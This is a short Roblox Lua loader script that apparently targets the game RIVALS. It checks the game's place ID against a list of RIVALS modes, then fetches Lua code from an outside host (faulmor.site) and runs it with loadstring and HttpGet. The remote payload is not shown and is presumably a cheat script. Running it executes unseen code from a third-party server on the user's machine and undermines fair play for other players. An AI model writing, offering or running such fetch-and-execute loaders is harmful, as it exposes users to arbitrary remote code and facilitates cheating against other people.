local places = {
	[17625359962] = true, -- RIVALS lobby
	[18126510175] = true, -- Mobile Hub
	[71874690745115] = true, -- Team Deathmatch
	[117398147513099] = true, -- Matchmaking
	[129604661913557] = true, -- Free For All
	[133215910299950] = true, -- Gun Game
}

if not places[game.PlaceId] then
	return warn("dude wtf are you doing? This only works in only rivals (" .. game.PlaceId .. ")")
end

loadstring(game:HttpGet("https://faulmor.site/v2/76043051f99dc7422dcae50589c7cb88/lua"))()
